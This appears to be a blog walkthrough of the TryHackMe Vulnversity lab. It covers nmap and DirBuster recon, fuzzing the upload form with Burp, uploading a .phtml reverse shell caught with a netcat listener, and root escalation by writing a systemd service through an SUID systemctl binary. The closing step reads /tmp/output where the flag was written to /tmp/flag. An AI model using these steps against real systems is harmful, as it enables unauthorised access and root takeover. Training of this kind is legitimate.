--- 
layout : post
title : TryHackMe Vulnversity
image: /assets/img/Vuln/main.png 
author: Edwards
date: 2020-10-08
categories: [CTF, TryHackMe]
tags: [Web, Linux, Easy, DirBuster, BurpSuite]
math: true
--- 

# Vulneversity

## Through this box we are going to learn :

- How to scan a website with nmap.
- Use DirBuster to find directories and files on web servers.
- Use BurpSuite to search for file extensions.
- Take advantage of SUID file to escalate our privileges on a linux system.

### Section 1 : Recon

Let's launch our Nmap scan.
```bash
edwards@kali:/home$ ip=10.10.19.92
edwards@kali:/home$ nmap -T4 -A -p- $ip
```
![image](/assets/img/Vuln/nmap.png)

We can see that a website is running on <ip>:3333 and it's potentially running on a Ubuntu OS

Let's look that website.

![image](/assets/img/Vuln/website.png)

_feel free to check inside the different pages, what you can do on the website etc..._

### Section 2 : Dirbuster

On this section we are gonna use Dirbuster to find sensitive directories.

launch Dirbuster with :
```bash
dirbuster
```
My configuration for the research.
- On the target url : The ip adress of the website with the port.
- File with list of dirs.files : the list avaible on the /usr/share/wordlists/dirbuster (I usually pick the medium one ) 
- File extension : php,js,html,htm (Basic file extensions on website)

![image](/assets/img/Vuln/config.png)

I found something interesting, the website got an internal/uploads page avaible. 
Let's check this page and what messy things we can do.

![image](/assets/img/Vuln/result.png)

As you can see, we can uploads file. Which is very good for us.

![image](/assets/img/Vuln/upload.png)

Try to upload some files with different extensions.
Apparently they don't like php file.

![image](/assets/img/Vuln/php.png)
_After a tentative of php uploading_

### Section 3 : BurpSuite 
_I'm not gonna explain how Burpsuite works in this room, so I will assume that you have a familiarity with Burpsuite already_

We are gonna use BurpSuite to know which php extensions are not blocked.
So let's fuzz the upload form !


Send this to intruder with "right-click" :
![image](/assets/img/Vuln/proxy.png)

I created a list with php extensions : 

![image](/assets/img/Vuln/ext.png)

At payload options, load your list : 
![image](/assets/img/Vuln/payload.png)

At position, erase all $ and add $$ so your .php is between them : 
![image](/assets/img/Vuln/dollars.png)

Then, start the attack ! 

Well.. that's a fail, but let's try manually, we are not gonna stop here.
![image](/assets/img/Vuln/fail.png)

Try to upload test.phtml
![image](/assets/img/Vuln/success.png)

We can see that the extension phtml. 
On TryHackMe you have a file avaible, it's actually a reverse shell, let's upload it on the server.

Before, change in the file the $ip and $port variable to your ip and the port that you are gonna use for the netcat part (1234).

![image](/assets/img/Vuln/variable.png)

With netcat start to listen to incoming connection from the webserver.
```bash
edwards@kali:~/Documents/Vul$ nc -lvnp 1234
listening on [any] 1234 ...
```

Navigate to :
```bash
http://<ip>:3333/internal/uploads/reverse_shell.phtml 
```

On your terminal you should see this :

![image](/assets/img/Vuln/connected.png)

This mean you are inside ! Congrats.

### Section 4 : Bill got pawned 

First we are gonna display the /etc/passwd to find the user that is running the web server.

![image](/assets/img/Vuln/bill.png)

Let's move to bill's directory, maybe the flag is there.
_On easy machine, it's highly possible that the flag is hidden in basic directory_

![image](/assets/img/Vuln/flagbill.png)

### Section 5 : Privilege Escalation
https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

We are asked to find SUID files to gain access as root. 

I used the command : 
```bash 
find / -perm -u=s -type f 2>/dev/null 
```

The systemctl stands out, 
the systemctl is a controlling interface and inspection tool for the systemd init service.

![image](/assets/img/Vuln/system.png)

I'm not gonna lie, I had no clue what to do with this. 
I found later on this website : https://gtfobins.github.io/gtfobins/systemctl/
a way to use this fault.
I change the id with "/root/root.txt".
```bash
var=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"

[Install]
WantedBy=multi-user.target' > $var

/bin/systemctl link $var
/bin/systemctl enable --now $var
```

What we have just done is basically take advantage of the systemctl to create a system service and run it as root.
The created service will execute "BASH" then read the flag and redirect the ouptu to our flag file in /tmp.

To have the flag you just have to cat the output file : 
```bash
cat /tmp/output 
```
